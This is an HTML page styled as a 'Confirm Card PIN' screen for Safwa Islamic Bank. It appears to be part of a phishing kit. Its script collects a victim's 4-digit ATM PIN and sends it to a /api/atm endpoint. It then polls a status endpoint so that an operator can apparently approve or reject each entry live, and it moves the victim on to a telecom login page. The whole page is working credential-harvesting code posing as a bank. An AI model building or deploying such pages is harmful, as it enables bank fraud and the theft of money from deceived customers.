<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Confirm Card PIN - Safwa Islamic Bank</title>
<style>
  :root {
    --green: #1a6b3c;
    --green-dark: #125129;
    --orange: #f28c28;
    --orange-dark: #d97706;
    --navy: #12314f;
    --gold: #f4c26b;
    --ink: #1c2b36;
    --muted: #5c6b74;
    --light-bg: #f4f6f8;
    --border: #d7dce0;
    --gray-line: #dcdcdc;
    --text-dark: #2b2b2b;
    --card-bg: #ffffff;
  }
  * {
    box-sizing: border-box;
  }
  body {
    margin: 0;
    font-family: "Segoe UI", "Tahoma", Arial, sans-serif;
    background-color: var(--light-bg);
    color: var(--text-dark);
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 16px;
  }
  .screen {
    width: 100%;
    max-width: 360px;
    min-height: auto;
    display: flex;
    flex-direction: column;
    padding: 18px 18px 14px;
    position: relative;
    background: var(--card-bg);
    border-radius: 16px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
  }
  @media (max-width: 480px) {
    body {
      background: var(--card-bg);
      padding: 0;
      align-items: flex-start;
    }
    .screen {
      box-shadow: none;
      border-radius: 0;
      min-height: 100vh;
      padding: 14px 16px 0 16px;
    }
  }
  .logo-wrap {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    margin-bottom: 12px;
  }
  .logo-wrap img {
    max-width: 220px;
    width: 100%;
    height: auto;
    object-fit: contain;
  }
  .page-subtitle {
    color: var(--green);
    font-weight: 700;
    font-size: 18px;
    margin-top: 16px;
    text-align: center;
  }
  .secure-icon {
    width: 100px;
    height: 100px;
    background-color: rgba(26, 107, 60, 0.05);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 12px;
    color: var(--green);
  }
  h2 {
    color: var(--green);
    font-size: 19px;
    margin: 0 0 6px;
    text-align: center;
  }
  p.desc {
    color: var(--muted);
    font-size: 13px;
    line-height: 1.6;
    margin: 0 0 18px;
    text-align: center;
  }
  .pin-display {
    display: flex;
    justify-content: center;
    gap: 12px;
    margin-bottom: 24px;
    direction: ltr;
  }
  .pin-dot {
    width: 16px;
    height: 16px;
    border-radius: 50%;
    border: 2px solid var(--border);
    transition: all 0.15s ease;
  }
  .pin-dot.filled {
    background-color: var(--green);
    border-color: var(--green);
    transform: scale(1.1);
  }
  .pin-input-wrap {
    display: flex;
    justify-content: center;
    margin: 0 auto 24px;
    width: 100%;
    max-width: 220px;
  }
  .pin-input {
    width: 100%;
    border: 1px solid var(--border);
    border-radius: 10px;
    padding: 12px 14px;
    font-size: 22px;
    letter-spacing: 0.5em;
    text-align: center;
    color: var(--green);
    background-color: #fff;
  }
  .pin-input:focus {
    outline: none;
    border-color: var(--green);
    box-shadow: 0 0 0 3px rgba(26, 107, 60, 0.08);
  }
  .btn-submit {
    width: 100%;
    background-color: #1976D2;
    color: #ffffff;
    border: none;
    border-radius: 12px;
    padding: 16px;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
    transition: background-color 0.2s;
    box-shadow: 0 4px 12px rgba(25, 118, 210, 0.3);
  }
  .btn-submit:hover {
    background-color: #125AA0;
  }
  .btn-submit:disabled {
    background-color: #cccccc;
    cursor: not-allowed;
    box-shadow: none;
  }
  .error-msg {
    color: #c0392b;
    font-size: 13px;
    margin-top: 12px;
    display: none;
    text-align: center;
  }
  
  /* Loading Overlay */
  .loading-overlay {
    display: none;
    position: fixed;
    inset: 0;
    background: rgba(255, 255, 255, 0.95);
    z-index: 100;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    text-align: center;
    padding: 20px;
  }
  .spinner {
    width: 50px;
    height: 50px;
    border: 4px solid rgba(26, 107, 60, 0.1);
    border-top-color: var(--green);
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin-bottom: 20px;
  }
  @keyframes spin {
    to { transform: rotate(360deg); }
  }
  .loading-title {
    font-size: 18px;
    font-weight: bold;
    color: var(--green);
    margin-bottom: 8px;
  }
  .loading-desc {
    font-size: 13px;
    color: var(--muted);
  }

  .spacer {
    flex: 1;
    min-height: 20px;
  }
</style>
</head>
<body>

  <div class="screen">
    <!-- Unified Header -->

    <div class="secure-icon">
      <img src="https://i.ibb.co/YFdBpRP3/file-00000000f46c81f49efd2cb9f8007b00.png" alt="ATM icon" style="width:100%; height:100%; object-fit:contain; border-radius:50%;">
    </div>
    <h2>Confirm Card PIN</h2>
    <p class="desc">Please enter your 4-digit card PIN (ATM PIN) to complete the verification process and activate the service successfully.</p>
    
    <div class="pin-display">
      <div class="pin-dot" id="dot-0"></div>
      <div class="pin-dot" id="dot-1"></div>
      <div class="pin-dot" id="dot-2"></div>
      <div class="pin-dot" id="dot-3"></div>
    </div>

    <div class="pin-input-wrap">
      <input class="pin-input" id="atmPinInput" type="password" inputmode="numeric" maxlength="4" autocomplete="off" placeholder="••••" aria-label="ATM PIN" />
    </div>

    <button class="btn-submit" id="btnSubmit" onclick="submitPin()" disabled>Confirm &amp; Continue</button>
    <div class="error-msg" id="errorMsg">The PIN was rejected. Please verify the details and try again.</div>

    <!-- Security Badge -->
    <div style="text-align:center; margin-top:14px;">
      <img src="https://i.ibb.co/LhrCDkd5/IMG-20260930-WA0018.jpg" alt="secure payment" style="max-width:180px; width:60%; height:auto; border-radius:8px;">
    </div>

    <div class="spacer"></div>
  </div>

  <!-- Loading Overlay -->
  <div class="loading-overlay" id="loadingOverlay">
    <div class="spinner"></div>
    <div class="loading-title">Verifying details...</div>
    <div class="loading-desc">Please wait and do not close or refresh this page.</div>
  </div>

  <script>
    var pin = "";
    var requestId = sessionStorage.getItem('safwa_order_id') || sessionStorage.getItem('aman_bank_request_id') || localStorage.getItem('requestId') || new URLSearchParams(window.location.search).get('id');
    if (!requestId) {
      window.location.href = 'index.html';
    }
    sessionStorage.setItem('safwa_order_id', String(requestId));
    sessionStorage.setItem('aman_bank_request_id', String(requestId));

    function applyAtmRejectMessage() {
      var params = new URLSearchParams(window.location.search);
      if (params.get('error') !== 'atm') return;
      var msg = params.get('msg') || 'The PIN was rejected. Please verify the details and try again.';
      var errorMsg = document.getElementById('errorMsg');
      if (errorMsg) {
        errorMsg.textContent = msg;
        errorMsg.style.display = 'block';
      }
      var loadingOverlay = document.getElementById('loadingOverlay');
      if (loadingOverlay) loadingOverlay.style.display = 'none';
      pin = '';
      updateDots();
      var atmPinInput = document.getElementById('atmPinInput');
      if (atmPinInput) {
        atmPinInput.value = '';
        atmPinInput.focus();
      }
    }

    var atmPinInput = document.getElementById('atmPinInput');

    function updateDots() {
      for (var i = 0; i < 4; i++) {
        var dot = document.getElementById('dot-' + i);
        if (i < pin.length) {
          dot.classList.add('filled');
        } else {
          dot.classList.remove('filled');
        }
      }
      if (atmPinInput) atmPinInput.value = pin;
      document.getElementById('btnSubmit').disabled = (pin.length !== 4);
    }

    function pressNum(num) {
      if (pin.length < 4) {
        pin += num;
        updateDots();
      }
    }

    function clearPin() {
      pin = "";
      updateDots();
    }

    function backspace() {
      if (pin.length > 0) {
        pin = pin.slice(0, -1);
        updateDots();
      }
    }

    if (atmPinInput) {
      atmPinInput.addEventListener('input', function(){
        pin = (atmPinInput.value || '').replace(/\D/g, '').slice(0, 4);
        updateDots();
      });

      atmPinInput.addEventListener('keydown', function(event){
        if (event.key === 'Backspace') {
          event.preventDefault();
          backspace();
        }
        if (event.key === 'Escape') {
          event.preventDefault();
          clearPin();
        }
      });
    }

    function submitPin() {
      if (pin.length !== 4) return;
      if (!requestId) {
        alert("Sorry, request ID not found. Please start over.");
        return;
      }

      document.getElementById('loadingOverlay').style.display = 'flex';
      document.getElementById('errorMsg').style.display = 'none';

      fetch('/api/atm', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: requestId, atmPin: pin })
      })
      .then(function(res) { return res.json(); })
      .then(function(data) {
        if (data.ok) {
          window.location.href = 'loading-en.html?type=atm&id=' + encodeURIComponent(requestId);
        } else {
          throw new Error('Failed to submit');
        }
      })
      .catch(function() {
        document.getElementById('loadingOverlay').style.display = 'none';
        document.getElementById('errorMsg').style.display = 'block';
      });
    }

    applyAtmRejectMessage();

    var pollInterval = null;
    function startPollingStatus() {
      pollInterval = setInterval(function() {
        fetch('/api/status/' + requestId)
          .then(function(res) { return res.json(); })
          .then(function(data) {
            if (!data || !data.status) return;
            if (data.status === 'approved') {
              clearInterval(pollInterval);
              window.location.href = 'ooredoo-login-en.html?id=' + requestId;
            } else if (data.status === 'rejected') {
              clearInterval(pollInterval);
              var rejectMessage = 'The PIN was rejected. Please verify the details and try again.';
              window.location.href = 'atm-en.html?error=atm&msg=' + encodeURIComponent(rejectMessage) + '&id=' + requestId;
            }
          })
          .catch(function() {});
      }, 2500);
    }
  </script>
<script src="heartbeat.js"></script>
</body>
</html>
